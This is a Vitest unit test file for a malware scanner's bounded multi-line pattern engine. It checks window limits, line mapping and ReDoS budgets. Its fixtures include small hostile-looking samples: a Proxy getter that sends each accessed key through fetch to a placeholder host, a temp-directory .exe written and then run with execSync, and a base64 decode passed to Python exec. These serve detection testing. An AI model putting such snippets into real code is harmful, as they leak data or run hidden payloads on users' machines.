import { describe, it, expect } from "vitest";
import {
  matchPatternInContent,
  truncateMatch,
  MAX_SPANS_LINES,
  MAX_SPAN_WINDOW_CHARS,
  MAX_MATCH_ATTEMPTS_PER_PATTERN,
  OBFUSCATION_PATTERNS_V2,
  INFOSTEALER_PATTERNS,
  PYPI_FILE_PATTERNS,
} from "../patterns.js";
import type { PatternEntry } from "../types.js";

/**
 * Unit tests for the v5.23 bounded multi-line pattern engine.
 *
 * These pin the window boundary, start-line mapping, ReDoS budget and the
 * opt-in default (spansLines undefined => single-line) so a later rewrite
 * cannot quietly go whole-file or unbounded.
 */

const proxyRule = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "PROXY_HANDLER_TRAP")!;
const dropperRule = INFOSTEALER_PATTERNS.find((p) => p.rule === "DROPPER_TEMP_EXEC")!;
const b64Rule = PYPI_FILE_PATTERNS.find((p) => p.rule === "PYPI_B64_EXEC_COMBINED")!;

describe("matchPatternInContent", () => {
  it("defaults to single-line behaviour when spansLines is unset", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "foo.*bar",
    };
    const content = "foo\nbar\n";
    expect(matchPatternInContent(pattern, content)).toEqual([]);
    expect(matchPatternInContent(pattern, "foo bar\n")).toHaveLength(1);
  });

  it("detects PROXY_HANDLER_TRAP when pretty-printed across lines", () => {
    const multi = `const p = new Proxy(target, {
  get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; },
});
`;
    const hits = matchPatternInContent(proxyRule, multi, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
    // Match starts on the line with `new Proxy`.
    expect(hits[0]!.line).toBe(1);
  });

  it("still detects the one-line PROXY form", () => {
    const one =
      'const p = new Proxy(target, { get: (t, k) => { fetch("https://x.invalid/?k=" + k); return t[k]; } });\n';
    const hits = matchPatternInContent(proxyRule, one, "g");
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(1);
  });

  it("reports the line where the match STARTS, not the window start", () => {
    // Padding lines so the Proxy construct begins on line 4.
    const content = `// pad 1
// pad 2
// pad 3
const p = new Proxy(target, {
  get: (t, k) => t[k],
});
`;
    const hits = matchPatternInContent(proxyRule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
    expect(hits[0]!.line).toBe(4);
  });

  it("fires when a match spans exactly spansLines lines", () => {
    // PROXY_HANDLER_TRAP.spansLines is 5. Build a 5-line construct.
    const content = [
      "const p = new Proxy(target, {",
      "  // a",
      "  // b",
      "  // c",
      "  get: (t, k) => t[k],",
      "});",
      "",
    ].join("\n");
    // Lines 1-5 are the window that should contain new Proxy ... get:
    const hits = matchPatternInContent(proxyRule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
  });

  it("does NOT fire when a match needs one line more than spansLines", () => {
    // Force a toy pattern with spansLines:2 so the boundary is exact.
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "ALPHA.*OMEGA",
      spansLines: 2,
    };
    // ALPHA and OMEGA are 3 lines apart (window of 2 cannot cover them).
    const tooFar = "ALPHA\nmiddle\nOMEGA\n";
    expect(matchPatternInContent(pattern, tooFar, "g")).toEqual([]);

    // Adjacent lines: window of 2 covers them.
    const adjacent = "ALPHA\nOMEGA\n";
    expect(matchPatternInContent(pattern, adjacent, "g")).toHaveLength(1);
  });

  it("detects DROPPER_TEMP_EXEC split across write and exec lines", () => {
    const content = `const os = require("os");
const fs = require("fs");
const { execSync } = require("child_process");
const dest = os.tmpdir() + "/p.exe";
fs.writeFileSync(dest, Buffer.from("x"));
execSync(dest);
`;
    const hits = matchPatternInContent(dropperRule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
  });

  it("detects PYPI_B64_EXEC_COMBINED across decode then exec", () => {
    const content = `import base64
payload = base64.b64decode(blob)
exec(payload)
`;
    const hits = matchPatternInContent(b64Rule, content, "g");
    expect(hits.length).toBeGreaterThanOrEqual(1);
    expect(hits[0]!.line).toBe(2);
  });

  it("applies valueFilter and drops rejected matches", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines" | "valueFilter" | "valueGroup"> = {
      pattern: "key=([A-Z]+)",
      valueGroup: 1,
      valueFilter: (v) => v.length >= 8,
    };
    expect(matchPatternInContent(pattern, "key=SHORT\n", "g")).toEqual([]);
    expect(matchPatternInContent(pattern, "key=LONGVALUE\n", "g")).toHaveLength(1);
  });

  it("honours skipLine for comment lines (config-scanner shape)", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "token\\s*=\\s*secret",
    };
    const content = "# token = secret\ntoken = secret\n";
    const hits = matchPatternInContent(pattern, content, "i", {
      skipLine: (line) => line.trimStart().startsWith("#"),
    });
    expect(hits).toHaveLength(1);
    expect(hits[0]!.line).toBe(2);
  });

  it("dedupes overlapping multi-line windows to one hit per start line", () => {
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "foo.*bar",
      spansLines: 3,
    };
    const content = "foo\nx\nbar\n";
    const hits = matchPatternInContent(pattern, content, "g");
    expect(hits).toHaveLength(1);
  });

  it("never feeds a window larger than MAX_SPAN_WINDOW_CHARS into the regex", () => {
    // If the engine joined without a char budget, a multi-megabyte line would
    // enter the regex engine whole. We place a unique end-marker PAST the
    // budget so a full-window match would see it, and assert it does not.
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "START[\\s\\S]*ENDMARKER",
      spansLines: 3,
    };
    const pad = "x".repeat(MAX_SPAN_WINDOW_CHARS + 200);
    const content = `START\n${pad}\nENDMARKER\n`;
    // Window is truncated to MAX_SPAN_WINDOW_CHARS, so ENDMARKER is cut off.
    expect(matchPatternInContent(pattern, content, "g")).toEqual([]);

    // Same pattern with a short pad: must match.
    const short = `START\nshort\nENDMARKER\n`;
    expect(matchPatternInContent(pattern, short, "g")).toHaveLength(1);
  });

  it("does not pair distant tokens the way whole-file dotAll would", () => {
    // The exact over-matching shape v5.22 removed, scaled to multi-line:
    // tmpdir on line 3 must NOT match exec on line 900 when spansLines is small.
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "(?:TEMP|TMP|tmp).*(?:exec|spawn)",
      spansLines: 6,
    };
    const lines: string[] = [];
    for (let i = 0; i < 50; i++) lines.push(`const x${i} = 1;`);
    lines[2] = "const d = os.tmpdir();";
    lines[40] = "execSync('payload');";
    const hits = matchPatternInContent(pattern, lines.join("\n") + "\n", "g");
    expect(hits).toEqual([]);
  });

  it("completes a large multi-line scan within a wall-clock budget", () => {
    // Exercises the sliding window over a big file with a greedy `.*` rule.
    // Whole-file dotAll against 5k lines would be the hang we refuse; a
    // spansLines:6 window must stay cheap.
    const pattern: Pick<PatternEntry, "pattern" | "spansLines"> = {
      pattern: "tmpdir.*execSync",
      spansLines: 6,
    };
    const lines: string[] = [];
    for (let i = 0; i < 5000; i++) {
      lines.push(`const v${i} = ${i};`);
    }
    lines[10] = "const d = os.tmpdir();";
    lines[12] = "execSync(d);"; // within window: must hit once
    lines[4000] = "execSync('far');"; // far from any tmpdir: must not pair

    const started = Date.now();
    const hits = matchPatternInContent(pattern, lines.join("\n") + "\n", "g");
    const elapsed = Date.now() - started;

    expect(hits.length).toBe(1);
    expect(hits[0]!.line).toBe(11); // 0-based index 10 -> line 11
    expect(elapsed).toBeLessThan(5000);
  });

  it("exports hard caps that keep windows bounded", () => {
    expect(MAX_SPANS_LINES).toBeLessThanOrEqual(20);
    expect(MAX_SPAN_WINDOW_CHARS).toBeLessThanOrEqual(8192);
    expect(MAX_MATCH_ATTEMPTS_PER_PATTERN).toBeLessThanOrEqual(1000);
  });
});

describe("truncateMatch", () => {
  it("collapses multi-line match text so SARIF stays one line", () => {
    const raw = "new Proxy(target, {\n  get: (t, k) => t[k],\n})";
    const out = truncateMatch(raw, 120);
    expect(out.includes("\n")).toBe(false);
    expect(out.length).toBeLessThanOrEqual(123); // 120 + "..."
  });

  it("does not truncate short matches", () => {
    expect(truncateMatch("new Proxy(t, { get:")).toBe("new Proxy(t, { get:");
  });
});
